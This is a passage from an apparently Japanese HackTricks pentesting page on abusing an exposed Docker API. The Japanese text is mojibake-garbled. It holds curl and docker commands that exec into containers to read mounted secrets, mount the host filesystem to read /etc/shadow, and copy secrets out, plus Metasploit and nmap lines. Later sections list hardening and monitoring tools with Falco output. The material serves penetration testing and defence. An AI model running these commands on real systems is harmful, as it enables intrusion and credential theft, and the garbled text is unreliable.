curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
ã‚‚ã—è©³ç´°æƒ…å ±ãŒå¿…è¦ãªå ´åˆã¯ã€ã‚³ãƒãƒ³ãƒ‰ã‚’ã‚³ãƒ”ãƒ¼ã—ãŸå…ƒã®å ´æ‰€ã§è©³ç´°æƒ…å ±ã‚’å…¥æ‰‹ã§ãã¾ã™ï¼š[https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### è‡ªå‹•åŒ–
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## Compromisingï¼ˆä¾µå®³ï¼‰

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€**Dockerã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ã®è„±å‡ºæ–¹æ³•**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã—ã€ãƒªãƒ¢ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## ç‰¹æ¨©æ˜‡æ ¼

ã‚‚ã—Dockerã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ãƒ›ã‚¹ãƒˆå†…ã«ã„ã‚‹å ´åˆã€ç‰¹æ¨©æ˜‡æ ¼ã‚’è©¦ã¿ã‚‹ãŸã‚ã«[**ã“ã®æƒ…å ±ã‚’èª­ã‚“ã§ãã ã•ã„**](../linux-hardening/privilege-escalation/#writable-docker-socket)ã€‚

## å®Ÿè¡Œä¸­ã®Dockerã‚³ãƒ³ãƒ†ãƒŠå†…ã®ç§˜å¯†ã®ç™ºè¦‹
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
ç§˜å¯†æƒ…å ±ã‚’æ¢ã™ãŸã‚ã«ã€**env**ï¼ˆç’°å¢ƒå¤‰æ•°ã‚»ã‚¯ã‚·ãƒ§ãƒ³ï¼‰ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã¿ã¦ãã ã•ã„ã€‚ä»¥ä¸‹ã®ã‚‚ã®ãŒè¦‹ã¤ã‹ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

* ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€‚
* IPã‚¢ãƒ‰ãƒ¬ã‚¹ã€‚
* ãƒãƒ¼ãƒˆç•ªå·ã€‚
* ãƒ‘ã‚¹ã€‚
* ãã®ä»–...ã€‚

ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŠ½å‡ºã—ãŸã„å ´åˆã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## Dockerã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–

### Dockerã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã¨ä½¿ç”¨ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–

* [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security)ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ç¾åœ¨ã®Dockerã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚’èª¿æŸ»ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* `./docker-bench-security.sh`
* [https://github.com/kost/dockscan](https://github.com/kost/dockscan)ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ç¾åœ¨ã®Dockerã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚’èª¿æŸ»ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* `dockscan -v unix:///var/run/docker.sock`
* [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained)ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ç•°ãªã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã—ãŸå ´åˆã®ã‚³ãƒ³ãƒ†ãƒŠã®ç‰¹æ¨©ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚³ãƒ³ãƒ†ãƒŠã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã®å½±éŸ¿ã‚’çŸ¥ã‚‹ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™ã€‚
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–

* [https://github.com/quay/clair](https://github.com/quay/clair)ã®Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦ã€ä»–ã®Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã€è„†å¼±æ€§ã‚’æ¤œå‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Dockerfileã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–

* [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter)ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€Dockerfileã‚’æ¤œæŸ»ã—ã€ã•ã¾ã–ã¾ãªè¨­å®šãƒŸã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å„è¨­å®šãƒŸã‚¹ã«ã¯IDãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚[https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md)ã§ãã‚Œãã‚Œã®ä¿®æ­£æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint)ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€Dockerfileã‚’æ¤œæŸ»ã—ã€ã•ã¾ã–ã¾ãªè¨­å®šãƒŸã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint)ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€Dockerfileã‚’æ¤œæŸ»ã—ã€ã•ã¾ã–ã¾ãªè¨­å®šãƒŸã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint)ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€Dockerfileã‚’æ¤œæŸ»ã—ã€ã•ã¾ã–ã¾ãªè¨­å®šãƒŸã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### ä¸å¯©ãªã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã®ãƒ­ã‚°è¨˜éŒ²

* [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco)ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€å®Ÿè¡Œä¸­ã®ã‚³ãƒ³ãƒ†ãƒŠã§ä¸å¯©ãªå‹•ä½œã‚’æ¤œå‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* æ¬¡ã®ãƒãƒ£ãƒ³ã‚¯ã§ã¯ã€FalcoãŒã‚«ãƒ¼ãƒãƒ«ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¦æŒ¿å…¥ã™ã‚‹æ–¹æ³•ã€ãã®å¾Œãƒ«ãƒ¼ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¦ä¸å¯©ãªã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚’è¨˜éŒ²ã™ã‚‹æ–¹æ³•ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®å ´åˆã€ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠãŒ2ã¤é–‹å§‹ã•ã‚Œã€ãã®ã†ã¡ã®1ã¤ãŒã‚»ãƒ³ã‚·ãƒ†ã‚£ãƒ–ãªãƒã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹ã“ã¨ãŒæ¤œå‡ºã•ã‚Œã€æ•°ç§’å¾Œã«ã¯ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ã‚·ã‚§ãƒ«ãŒé–‹ã‹ã‚ŒãŸã“ã¨ãŒæ¤œå‡ºã•ã‚Œã¾ã—ãŸã€‚
```
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### Dockerã®ç›£è¦–

Dockerã‚’ç›£è¦–ã™ã‚‹ãŸã‚ã«ã€auditdã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ã‚ãªãŸã¯**ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
